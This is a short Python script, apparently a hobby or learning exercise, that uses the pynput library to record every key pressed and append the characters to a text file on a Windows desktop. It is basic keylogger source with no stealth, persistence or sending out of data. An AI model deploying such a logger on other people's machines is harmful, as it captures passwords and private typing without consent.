from pynput import keyboard

def keypress(key):
    print(str(key))
    with open("C:/Users/GOKUL/Desktop/keyfile.txt",'a') as log:
        try:
            char = key.char
            log.write(char + " ")
        except:
            print("Error in getting char")

    
    
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypress)

    listener.start() 
    input()
    